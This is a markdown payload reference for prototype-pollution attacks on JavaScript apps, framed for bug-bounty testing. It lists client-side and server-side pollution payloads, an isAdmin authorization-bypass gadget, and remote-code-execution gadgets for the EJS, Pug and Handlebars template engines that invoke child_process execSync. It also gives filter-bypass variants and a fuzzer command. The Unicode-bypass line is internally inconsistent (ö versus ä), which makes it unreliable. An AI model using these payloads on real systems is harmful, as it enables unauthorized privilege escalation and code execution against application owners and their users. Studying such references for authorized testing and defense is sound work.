# Prototype Pollution — payload reference

> Class: a user-controlled property is merged into `Object.prototype` → affects ALL runtime objects.
> Client-side → DOM-XSS / cookie-manip / authz-bypass; server-side (Node) → RCE via a gadget in template
> engines and CLI wrappers. Rule: **`__proto__` in a request != a finding** — report only when the polluted
> property ACTUALLY changes the app's behavior (reaches a sink). The canonical catalog — BlackFan's
> client-side PP.

## Detection (quick probe)

- Client: `https://target/?__proto__[polluted]=true` → in the console, `Object.prototype.polluted` returns
  the value.
- Server: `POST /api/config` with `{"__proto__":{"isAdmin":true}}` → a later response/behavior shows the
  polluted property.

## Payloads

- **Client-side: `__proto__` in query / JSON / form**:
  `?__proto__[test]=polluted`, `?constructor[prototype][test]=polluted`;
  JSON `{"__proto__":{"polluted":"yes"}}`; form `__proto__[polluted]=true`;
  via Object.assign/spread `{"constructor":{"prototype":{"isAdmin":true}}}`.
  - Detection Signal: `Object.prototype.<key>` === the injected value in the victim's console / reflected in
    the response.
- **Server-side (Node) via a JSON-body merge**: `{"__proto__":{"isAdmin":true}}` to an endpoint with
  `_.merge`/`_.defaultsDeep`/`_.set`/`$.extend(true,...)`/`Object.assign` over the request body without a
  `hasOwnProperty` check.
  - Detection Signal: the pollution survives the request (visible in another response/second-order context).
- **Authz-bypass gadget**: if the code checks `if (user.isAdmin)` without `hasOwnProperty` — pollute
  `isAdmin`/`role`/`isVerified`/`premium`. `{"__proto__":{"isAdmin":true}}`.
  - Detection Signal: a privileged action/field is accessible without a real role after pollution.
- **Server-side RCE — EJS (`outputFunctionName`)**:
  `{"__proto__":{"outputFunctionName":"_tmp;global.process.mainModule.require('child_process').
  execSync('id');"}}`.
  - Detection Signal: `id` output in the render response / OOB.
- **Server-side RCE — Pug (`self.block`)**:
  `{"__proto__":{"block":{"type":"Text","line":"process.mainModule.require('child_process').execSync
  ('id')"}}}`.
  - Detection Signal: the command executes on template render.
- **Server-side RCE — Handlebars (`compileFunction`)**:
  `{"__proto__":{"precompileOptions":{"knownHelpersOnly":false,"compat":true},"compileFunction":
  "return process.mainModule.require('child_process').execSync('id').toString();"}}`.
  - Detection Signal: command output in the response.
- **RCE — `NODE_OPTIONS` / child_process injection**:
  `{"__proto__":{"NODE_OPTIONS":"--require /proc/self/environ","shell":"/bin/sh","env":{...}}}` —
  when the polluted options reach `child_process.exec/spawn`.
  - Detection Signal: a spawned process inherits the polluted options → execution.
- **Known sinks (lodash/jquery)**: `_.merge`, `_.mergeWith`, `_.defaultsDeep`, `_.set`, `_.setWith`,
  `$.extend(true, ...)`; client — merge attacker JSON into an object's options where a `url`/`src`/`html` key
  reaches the DOM (`{url:"javascript:alert(1)"}`, `innerHTML`).
  - Detection Signal: the polluted property reaches `innerHTML`/`eval`/`document.write`/a script `src`.
- **Second-order pollution**: `{"name":{"__proto__":{"isAdmin":true}}}` — stored in the DB, fires when a
  background job/admin processes the object in a PRIVILEGED context.
  - Detection Signal: the effect appears later in the consumer context (an admin view/cron).

## Filter-bypass

- **Unicode-normalize**: `__pröto__[test]=1` (ä→a after normalization) bypasses a blacklist on the string
  `__proto__`.
- **The `constructor.prototype` path** instead of `__proto__`: `{"constructor":{"prototype":{"polluted":true}}}`.
- **Array-coercion (lodash)**: `{"__proto__":{"polluted":[]}}`.
- Auto-scan: `ppfuzz -u https://target/api/merge -m POST -H "Content-Type: application/json"`.

## Anti-FP / what NOT to submit on its own

- **Not every `__proto__` = a bug** — report only on real behavior impact (reaching a sink / an authz change /
  an XSS trigger).
- **Server-side PP without a gadget = zero impact** — polluting random objects without reaching exec/eval/a
  template is not exploitable.
- **Node.js 12+ and recent lodash have partial mitigations** — check the version/old paths first; "it
  polluted in the console" without a sink != a finding.
- **Client-side pollution** must be proven with a concrete sink (DOM-XSS/authz), not just `Object.prototype.x`.
